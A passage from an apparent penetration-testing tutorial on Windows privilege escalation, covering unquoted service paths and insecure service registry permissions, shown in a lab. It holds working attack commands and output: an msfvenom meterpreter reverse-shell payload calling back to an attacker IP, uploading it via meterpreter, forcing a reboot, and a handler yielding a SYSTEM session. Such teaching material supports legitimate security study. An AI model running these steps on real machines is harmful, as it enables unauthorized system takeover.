<p>F = Full Control<br>
CI = Container Inherit – This flag indicates that subordinate containers will inherit this ACE.<br>
OI = Object Inherit – This flag indicates that subordinate files will inherit the ACE.</p>
<p>This means we are free to put any file to this folder!</p>
<p>From now on, what you’re going to do depends on your imagination. I simply preferred to generate a reverse shell payload to run as SYSTEM.</p>
<p>MSFvenom&nbsp;can be used for this job:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="1" style="display: none;">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai chosen with final size 360
Payload size: 360 bytes
Final size of exe file: 73802 bytes
Saved as: A.exe</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">root@kali:~</span><span class="co1"># msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe</span><span class=""></span></li><li class=" even"><span class="">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></li><li class=" odd"><span class="">No Arch selected, selecting Arch: x86 from the payload</span></li><li class=" even"><span class="">Found </span><span class="nu0">1</span><span class=""> compatible encoders</span></li><li class=" odd"><span class="">Attempting to encode payload with </span><span class="nu0">1</span><span class=""> iterations of x86/shikata_ga_nai</span></li><li class=" even"><span class="">x86/shikata_ga_nai succeeded with size </span><span class="kw1">360</span><span class=""> </span><span class="br0">(</span><span class="">iteration=</span><span class="nu0">0</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">x86/shikata_ga_nai chosen with final size </span><span class="nu0">360</span><span class=""></span></li><li class=" even"><span class="">Payload size: </span><span class="nu0">360</span><span class=""> bytes</span></li><li class=" odd"><span class="">Final size of exe file: </span><span class="nu0">73802</span><span class=""> bytes</span></li><li class=" even"><span class="">Saved as: A.exe</span></li></ol><pre style="display: none;">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai chosen with final size 360
Payload size: 360 bytes
Final size of exe file: 73802 bytes
Saved as: A.exe</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Let’s place&nbsp;our payload to <em>C:\Program Files (x86)\Program Folder</em> folder:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="12" style="display: none;">meterpreter &gt; getuid
Server username: TARGETMACHINE\testuser
meterpreter &gt; cd "../../../Program Files (x86)/Program Folder"
meterpreter &gt; ls
Listing: C:\Program Files (x86)\Program Folder
==============================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-01-04 21:43:28 -0500  A Subfolder

meterpreter &gt; upload -f A.exe
[*] uploading  : A.exe -&gt; A.exe
[*] uploaded   : A.exe -&gt; A.exe
meterpreter &gt; ls
Listing: C:\Program Files (x86)\Program Folder
==============================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   0      dir   2017-01-04 21:43:28 -0500  A Subfolder
100777/rwxrwxrwx  73802  fil   2017-01-04 22:01:32 -0500  A.exe

meterpreter &gt; 
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; getuid</span></li><li class=" even"><span class="">Server username: TARGETMACHINE\testuser</span></li><li class=" odd"><span class="">meterpreter &gt; cd </span><span class="st0">"../../../Program Files (x86)/Program Folder"</span><span class=""></span></li><li class=" even"><span class="">meterpreter &gt; ls</span></li><li class=" odd"><span class="">Listing: C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Program Folder</span></li><li class=" even"><span class="">==============================================</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">Mode             Size  Type  Last modified              Name</span></li><li class=" odd"><span class="">----             ----  ----  -------------              ----</span></li><li class=" even"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx  </span><span class="nu0">0</span><span class="">     dir   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">04</span><span class=""> </span><span class="nu0">21</span><span class="">:</span><span class="nu0">43</span><span class="">:</span><span class="nu0">28</span><span class=""> -</span><span class="nu0">0500</span><span class="">  A Subfolder</span></li><li class=" odd"><span class=""></span></li><li class="specialline even"><span class="">meterpreter &gt; upload -f A.exe</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploading  : A.exe -&gt; A.exe</span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploaded   : A.exe -&gt; A.exe</span></li><li class=" odd"><span class="">meterpreter &gt; ls</span></li><li class=" even"><span class="">Listing: C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Program Folder</span></li><li class=" odd"><span class="">==============================================</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">Mode              Size   Type  Last modified              Name</span></li><li class=" even"><span class="">----              ----   ----  -------------              ----</span></li><li class=" odd"><span class=""></span><span class="nu0">40777</span><span class="">/rwxrwxrwx   </span><span class="nu0">0</span><span class="">      dir   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">04</span><span class=""> </span><span class="nu0">21</span><span class="">:</span><span class="nu0">43</span><span class="">:</span><span class="nu0">28</span><span class=""> -</span><span class="nu0">0500</span><span class="">  A Subfolder</span></li><li class=" even"><span class=""></span><span class="nu0">100777</span><span class="">/rwxrwxrwx  </span><span class="nu0">73802</span><span class="">  fil   </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">04</span><span class=""> </span><span class="nu0">22</span><span class="">:</span><span class="nu0">01</span><span class="">:</span><span class="nu0">32</span><span class=""> -</span><span class="nu0">0500</span><span class="">  A.exe</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">meterpreter &gt; </span></li></ol><pre style="display: none;">meterpreter &gt; getuid
Server username: TARGETMACHINE\testuser
meterpreter &gt; cd "../../../Program Files (x86)/Program Folder"
meterpreter &gt; ls
Listing: C:\Program Files (x86)\Program Folder
==============================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-01-04 21:43:28 -0500  A Subfolder

meterpreter &gt; upload -f A.exe
[*] uploading  : A.exe -&gt; A.exe
[*] uploaded   : A.exe -&gt; A.exe
meterpreter &gt; ls
Listing: C:\Program Files (x86)\Program Folder
==============================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   0      dir   2017-01-04 21:43:28 -0500  A Subfolder
100777/rwxrwxrwx  73802  fil   2017-01-04 22:01:32 -0500  A.exe

meterpreter &gt; </pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>At the next start of the service, <em>A.exe</em> will run as SYSTEM. Let’s try to stop and restart the service:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="7" style="display: none;">meterpreter &gt; shell
Process 1608 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Desktop&gt;sc stop "Vulnerable Service"
sc stop "Vulnerable Service"
[SC] OpenService FAILED 5:

Access is denied.


C:\Users\testuser\Desktop&gt;
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">1608</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">2</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\Desktop&gt;sc stop </span><span class="st0">"Vulnerable Service"</span><span class=""></span></li><li class=" even"><span class="">sc stop </span><span class="st0">"Vulnerable Service"</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">SC</span><span class="br0">]</span><span class=""> OpenService FAILED </span><span class="nu0">5</span><span class="">:</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">Access is denied.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Users\testuser\Desktop&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; shell
Process 1608 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Desktop&gt;sc stop "Vulnerable Service"
sc stop "Vulnerable Service"
[SC] OpenService FAILED 5:

Access is denied.


C:\Users\testuser\Desktop&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Access is denied because we don’t have permission to stop or start the service. However, it’s not a big deal, we can wait for someone to restart the&nbsp;machine, or we can do it ourselves with <em>shutdown</em> command:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1" style="display: none;">C:\Users\testuser\Desktop&gt;shutdown /r /t 0
shutdown /r /t 0

C:\Users\testuser\Desktop&gt;
[*] 192.168.2.40 - Meterpreter session 8 closed. Reason: Died</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">C:\Users\testuser\Desktop&gt;shutdown /r /t </span><span class="nu0">0</span><span class=""></span></li><li class=" even"><span class="">shutdown /r /t </span><span class="nu0">0</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Users\testuser\Desktop&gt;</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.40</span><span class=""> - Meterpreter session </span><span class="nu0">8</span><span class=""> closed. Reason: Died</span></li></ol><pre style="display: none;">C:\Users\testuser\Desktop&gt;shutdown /r /t 0
shutdown /r /t 0

C:\Users\testuser\Desktop&gt;
[*] 192.168.2.40 - Meterpreter session 8 closed. Reason: Died</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>As you can see, our session has died. We’ll never forget you low-priv shell. RIP.</p>
<p>Our target machine is restarting now.&nbsp;Soon, our payload will work as SYSTEM. We should start a handler&nbsp;right away.</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="8-11" style="display: none;">msf &gt; use exploit/multi/handler 
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.2.60 
lhost =&gt; 192.168.2.60
msf exploit(handler) &gt; set lport 8989
lport =&gt; 8989
msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.2.40
[*] Meterpreter session 1 opened (192.168.2.60:8989 -&gt; 192.168.2.40:49156) at 2017-01-04 22:37:17 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; 
[*] 192.168.2.40 - Meterpreter session 1 closed.  Reason: Died

</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">msf &gt; use exploit/multi/handler </span></li><li class=" even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; set payload windows/meterpreter/reverse_tcp</span></li><li class=" odd"><span class="">payload =&gt; windows/meterpreter/reverse_tcp</span></li><li class=" even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; set lhost </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class=""> </span></li><li class=" odd"><span class="">lhost =&gt; </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class=""></span></li><li class=" even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; set lport </span><span class="nu0">8989</span><span class=""></span></li><li class=" odd"><span class="">lport =&gt; </span><span class="nu0">8989</span><span class=""></span></li><li class="specialline even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; run</span></li><li class="specialline odd"><span class=""></span></li><li class="specialline even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Started reverse TCP handler on </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> </span></li><li class="specialline odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Starting the payload handler...</span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Sending </span><span class="kw1">stage</span><span class=""> </span><span class="br0">(</span><span class="nu0">957999</span><span class=""> bytes</span><span class="br0">)</span><span class=""> to </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.40</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Meterpreter session </span><span class="nu0">1</span><span class=""> </span><span class="kw1">opened</span><span class=""> </span><span class="br0">(</span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> -&gt; </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.40</span><span class="">:</span><span class="nu0">49156</span><span class="br0">)</span><span class=""> at </span><span class="nu0">2017</span><span class="">-</span><span class="nu0">01</span><span class="">-</span><span class="nu0">04</span><span class=""> </span><span class="nu0">22</span><span class="">:</span><span class="nu0">37</span><span class="">:</span><span class="nu0">17</span><span class=""> -</span><span class="nu0">0500</span><span class=""></span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">meterpreter &gt; getuid</span></li><li class=" even"><span class="">Server username: NT AUTHORITY\SYSTEM</span></li><li class=" odd"><span class="">meterpreter &gt; </span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.40</span><span class=""> - Meterpreter session </span><span class="nu0">1</span><span class=""> closed.  Reason: Died</span></li></ol><pre style="display: none;">msf &gt; use exploit/multi/handler 
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.2.60 
lhost =&gt; 192.168.2.60
msf exploit(handler) &gt; set lport 8989
lport =&gt; 8989
msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.2.40
[*] Meterpreter session 1 opened (192.168.2.60:8989 -&gt; 192.168.2.40:49156) at 2017-01-04 22:37:17 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; 
[*] 192.168.2.40 - Meterpreter session 1 closed.  Reason: Died</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Now we have gotten a Meterpreter shell with SYSTEM privileges. High five!</p>
<p>But wait,&nbsp;why did our session&nbsp;die so quickly?&nbsp;We just started!</p>
<p>No need to worry. It’s because, when a service starts in Windows operating systems, it must communicate with the Service Control Manager. If it’s not, Service Control Manager thinks that something is not going well and&nbsp;terminates the process.</p>
<p>All we need to do is migrating to another process before the SCM terminates our payload, or you can consider using auto-migration. <img draggable="false" class="emoji" alt="😉" src="./Windows Privilege Escalation Methods_files/1f609.svg"></p>
<p>BTW there is a Metasploit module for checking and exploiting this vulnerability:&nbsp;<a href="https://www.rapid7.com/db/modules/exploit/windows/local/trusted_service_path"><em>exploit/windows/local/trusted_service_path</em></a></p>
<p>This module only requires that you link it to an existing Meterpreter session before running:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="1,8" style="display: none;">msf &gt; use exploit/windows/local/trusted_service_path
msf exploit(trusted_service_path) &gt; show options

Module options (exploit/windows/local/trusted_service_path):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">msf &gt; use exploit/windows/local/trusted_service_path</span></li><li class=" even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">trusted_service_path</span><span class="br0">)</span><span class=""> &gt; show options</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">Module </span><span class="kw1">options</span><span class=""> </span><span class="br0">(</span><span class="">exploit/windows/local/trusted_service_path</span><span class="br0">)</span><span class="">:</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">   Name     Current Setting  Required  Description</span></li><li class=" odd"><span class="">   ----     ---------------  --------  -----------</span></li><li class="specialline even"><span class="">   SESSION                   yes       The session to run this module on.</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">Exploit target:</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">   Id  Name</span></li><li class=" even"><span class="">   --  ----</span></li><li class=" odd"><span class="">   </span><span class="nu0">0</span><span class="">   Windows</span></li></ol><pre style="display: none;">msf &gt; use exploit/windows/local/trusted_service_path
msf exploit(trusted_service_path) &gt; show options

Module options (exploit/windows/local/trusted_service_path):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>However, it’s always good to know the internals. <img draggable="false" class="emoji" alt="😉" src="./Windows Privilege Escalation Methods_files/1f609.svg"></p>
<p>If you want to demonstrate this vulnerability&nbsp;yourself, you can add a vulnerable service to your test environment:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="7,9" style="display: none;">C:\Windows\System32&gt;sc create "Vulnerable Service" binPath= "C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe" start=auto
C:\Windows\System32&gt;cd C:\Program Files (x86)
C:\Program Files (x86)&gt;mkdir "Program Folder\A Subfolder"
C:\Program Files (x86)&gt;icacls "C:\Program Files (x86)\Program Folder" /grant Everyone:(OI)(CI)F /T

</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">C:\Windows\System32&gt;sc create </span><span class="st0">"Vulnerable Service"</span><span class=""> binPath= </span><span class="st0">"C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe"</span><span class=""> start=auto</span></li><li class=" even"><span class="">C:\Windows\System32&gt;cd C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">&gt;mkdir </span><span class="st0">"Program Folder\A Subfolder"</span><span class=""></span></li><li class=" even"><span class="">C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">&gt;icacls </span><span class="st0">"C:\Program Files (x86)\Program Folder"</span><span class=""> /grant Everyone:</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="">F /T</span></li></ol><pre style="display: none;">C:\Windows\System32&gt;sc create "Vulnerable Service" binPath= "C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe" start=auto
C:\Windows\System32&gt;cd C:\Program Files (x86)
C:\Program Files (x86)&gt;mkdir "Program Folder\A Subfolder"
C:\Program Files (x86)&gt;icacls "C:\Program Files (x86)\Program Folder" /grant Everyone:(OI)(CI)F /T</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<h3>Services with Vulnerable Privileges</h3>
<p>You know, Windows services run as SYSTEM. So, their folders, files, and registry keys&nbsp;must be protected with strong access controls. In some cases, we encounter services that are not sufficiently protected.</p>
<h4>Insecure Registry Permissions</h4>
<p>In Windows, information related to services is stored in <em>HKLM\SYSTEM\CurrentControlSet\Services&nbsp;</em>registry key. If we want to&nbsp;see information about our “Vulnerable Service” we should check&nbsp;<em>HKLM\SYSTEM\ControlSet001\Services\Vulnerable Service</em> key.</p>
<p><img class="alignnone wp-image-701" src="./Windows Privilege Escalation Methods_files/vulnerable-privileges-300x116.png" alt="" width="856" height="331" srcset="https://pentest.blog/wp-content/uploads/vulnerable-privileges-300x116.png 300w, https://pentest.blog/wp-content/uploads/vulnerable-privileges-768x296.png 768w, https://pentest.blog/wp-content/uploads/vulnerable-privileges.png 856w" sizes="(max-width: 856px) 100vw, 856px"></p>
<p>Of course, our Vulnerable Service has some weaknesses. <img draggable="false" class="emoji" alt="🙂" src="./Windows Privilege Escalation Methods_files/1f642.svg"></p>
<p><img class="alignnone size-medium wp-image-702" src="./Windows Privilege Escalation Methods_files/vulnerable-privileges-2-247x300.png" alt="" width="247" height="300" srcset="https://pentest.blog/wp-content/uploads/vulnerable-privileges-2-247x300.png 247w, https://pentest.blog/wp-content/uploads/vulnerable-privileges-2.png 377w" sizes="(max-width: 247px) 100vw, 247px"></p>
<p>But the point is,&nbsp;how can we check these permissions from the command line? Let’s start the scenario&nbsp;from the beginning.</p>
<p>You have gotten a low-priv Meterpreter session and you want to check permissions of&nbsp;a service.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">meterpreter &gt; getuid
Server username: TARGETMACHINE\testuser</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; getuid</span></li><li class=" even"><span class="">Server username: TARGETMACHINE\testuser</span></li></ol><pre style="display: none;">meterpreter &gt; getuid
Server username: TARGETMACHINE\testuser</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>You can use&nbsp;<a href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">SubInACL</a> tool to&nbsp;check registry keys permissions. You can download it&nbsp;<a href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">here</a>&nbsp;but&nbsp;the point you need to be aware of it&nbsp;deployed as an msi file.&nbsp;If AlwaysInstallElevated policy setting is not enabled on target machine you can’t install msi files with low-priv user.(We will discuss AlwaysInstallElevated policy later in this post) And of course, you may do not want to install a new software&nbsp;to the target machine.</p>
<p>I recommend you to install it a virtual machine and find <em>subinacl.exe</em> file in <em>C:\Program Files (x86)\Windows Resource Kits\Tools\.</em> It will work smoothly without having to install msi&nbsp;package.</p>
<p>Let’s upload SubInACL<i>&nbsp;</i>tool to our target:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="4" style="display: none;">meterpreter &gt; cd %temp%
meterpreter &gt; pwd
C:\Users\testuser\AppData\Local\Temp
meterpreter &gt; upload -f subinacl.exe
[*] uploading  : subinacl.exe -&gt; subinacl.exe
[*] uploaded   : subinacl.exe -&gt; subinacl.exe
meterpreter &gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; cd %temp%</span></li><li class=" even"><span class="">meterpreter &gt; pwd</span></li><li class=" odd"><span class="">C:\Users\testuser\AppData\Local\Temp</span></li><li class="specialline even"><span class="">meterpreter &gt; upload -f subinacl.exe</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploading  : subinacl.exe -&gt; subinacl.exe</span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploaded   : subinacl.exe -&gt; subinacl.exe</span></li><li class=" odd"><span class="">meterpreter &gt;</span></li></ol><pre style="display: none;">meterpreter &gt; cd %temp%
meterpreter &gt; pwd
C:\Users\testuser\AppData\Local\Temp
meterpreter &gt; upload -f subinacl.exe
[*] uploading  : subinacl.exe -&gt; subinacl.exe
[*] uploaded   : subinacl.exe -&gt; subinacl.exe
meterpreter &gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Now SubInACL tool ready to use. Let’s check permissions for&nbsp;<em>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service.</em></p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="7,20-23" style="display: none;">meterpreter &gt; shell
Process 2196 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\AppData\Local\Temp&gt;subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
SeSecurityPrivilege : Access is denied.

WARNING :Unable to set SeSecurityPrivilege privilege. This privilege may be required. 

================================================================================
+KeyReg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service
================================================================================
/control=0x400 SE_DACL_AUTO_INHERITED-0x0400 
/owner             =builtin\administrators
/primary group     =system
/perm. ace count   =10
/pace =everyone 	ACCESS_ALLOWED_ACE_TYPE-0x0
  CONTAINER_INHERIT_ACE-0x2      
    Key and SubKey - Type of Access:
  Full Control
    Detailed Access Flags :
  KEY_QUERY_VALUE-0x1        KEY_SET_VALUE-0x2          KEY_CREATE_SUB_KEY-0x4     
  KEY_ENUMERATE_SUB_KEYS-0x8 KEY_NOTIFY-0x10            KEY_CREATE_LINK-0x20       DELETE-0x10000             
  READ_CONTROL-0x20000       WRITE_DAC-0x40000          WRITE_OWNER-0x80000        
.
.
.
.
.
.


